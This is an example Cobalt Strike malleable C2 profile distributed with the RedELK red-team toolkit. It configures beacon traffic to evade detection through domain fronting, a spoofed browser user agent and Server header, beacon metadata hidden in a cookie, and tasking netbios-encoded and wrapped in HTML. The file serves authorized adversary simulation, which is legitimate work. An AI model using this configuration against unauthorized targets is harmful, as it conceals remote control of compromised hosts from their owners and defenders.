# Part of RedELK
#
# This is a basic example malleable configuration file for Cobalt Strike that works with RedELK
#
# Author: Outflank B.V. / Marc Smeets
#
# ##########################################################################################
# THIS IS AN EXAMPLE. DO NOT RUN IT AS-IS ON AN ENGAGEMENT.
#
# A malleable profile is a signature. This one is published on GitHub, so every indicator in
# it - the URIs, the Cookie prefix, the fake Server header, the HTML the tasking is wrapped in
# - is known to every vendor that reads GitHub, and so is the fact that RedELK ships it. Treat
# this file as a worked example of the structure and change every literal in it per engagement.
# Run ./c2lint <profile> from the Cobalt Strike directory after every change.
# ##########################################################################################
#
# Important 1 - change $NameOfYourDomainFrontingEndpoint below to your domain fronting
#   endpoint, e.g. somefancyname.azureedge.net
# Important 2 - configure the listener in Cobalt Strike accordingly: set the HTTP Host Header
#   to your domain fronting endpoint, and set the HTTP Hosts to a frontable domain.
# Important 3 - the URIs below are matched by the redirector rules in the Apache, HAProxy and
#   nginx examples in this repository. Change them here and you have to change them there too,
#   or your beacons get sent to the decoy site.

set sleeptime "45000";
set jitter    "37";

# Chrome on Windows 11. Pick something that fits the target environment - a user agent nobody
# else in the network sends is as loud as no user agent at all.
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";

# do not serve payloads to anyone who asks for the staging URI
set host_stage "false";

http-config {
	set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
	header "Server" "Apache";
	header "Keep-Alive" "timeout=5, max=100";
	header "Connection" "Keep-Alive";
	# the redirectors add X-Forwarded-For, this makes the teamserver show the real target IP
	set trust_x_forwarded_for "true";
}

http-get {
	set uri "/TRAINING-BEACON";

	client {
		header "Host" "$NameOfYourDomainFrontingEndpoint";
		header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
		header "Accept-Language" "en-US,en;q=0.9";
		header "Connection" "Keep-Alive";

		metadata {
			# base64url, not base64: a cookie value cannot carry + / and =
			base64url;
			prepend "SESSIONID=";
			header "Cookie";
		}
	}

	server {
		header "Content-Type" "text/html; charset=utf-8";
		header "Cache-Control" "no-cache, no-store, must-revalidate";
		header "Connection" "Keep-Alive";

		# the tasking is netbios-encoded and wrapped in something that survives a glance at
		# the response body. Beacon reverses these transforms, so any pair works as long as
		# what the redirector and the CDN see still looks like the site you are pretending
		# to be.
		output {
			netbios;
			prepend "<html><body><div id=content>";
			append "</div></body></html>";
			print;
		}
	}
}

http-post {
	set uri "/TRAINING-BEACON/submit.php";
	set verb "POST";

	client {
		header "Host" "$NameOfYourDomainFrontingEndpoint";
		header "Content-Type" "application/octet-stream";
		header "Accept" "*/*";
		header "Connection" "Keep-Alive";

		id {
			base64url;
			parameter "id";
		}

		output {
			print;
		}
	}

	server {
		header "Content-Type" "text/html";
		header "Cache-Control" "no-cache, no-store, must-revalidate";

		output {
			print;
		}
	}
}
